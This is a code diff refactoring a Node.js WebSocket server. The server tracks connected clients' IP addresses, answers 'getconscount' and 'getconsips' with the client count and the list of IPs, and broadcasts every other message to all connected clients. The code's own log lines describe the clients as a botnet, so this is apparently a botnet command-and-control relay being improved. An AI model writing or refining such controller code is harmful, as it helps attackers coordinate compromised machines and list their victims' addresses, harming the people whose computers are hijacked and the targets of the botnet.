@@ -1,28 +1,29 @@
 const WebSocket = require('ws');
-const wss = new WebSocket.Server({ host: '0.0.0.0', port: 8080 });
 
-let clients = new Map();
+const wss = new WebSocket.Server({ host: '0.0.0.0',  port: 8080 });
 
-wss.on('connection', (ws) => {
-  const clientIP = ws._socket.remoteAddress;
-  clients.set(ws, clientIP);  // Store client IP
+const clients = new Map();
+
+wss.on('connection', (ws, req) => {
+  const clientIP = req.socket.remoteAddress;
+  clients.set(ws, clientIP);
   console.log(`Client connected: ${clientIP}`);
 
   ws.on('message', (message) => {
     console.log(`Received: ${message}`);
-    
+
     if (message === 'getconscount') {
       ws.send(`${clients.size}`);
       console.log('Sent size of botnet');
     } else if (message === 'getconsips') {
-      const ips = [...clients.values()].join('|');  // Join IPs with "|"
+      const ips = Array.from(clients.values()).join('|');
       ws.send(ips);
       console.log('Sent IPs of botnet');
     } else {
-      // Broadcast message to all other clients
-      clients.forEach((client, clientSocket) => {
-        if (clientSocket !== ws) {
-          clientSocket.send(message);
+      // Broadcast to all other clients
+      clients.forEach((_, client) => {
+        if (client !== ws && client.readyState === WebSocket.OPEN) {
+          client.send(message);
         }
       });
     }
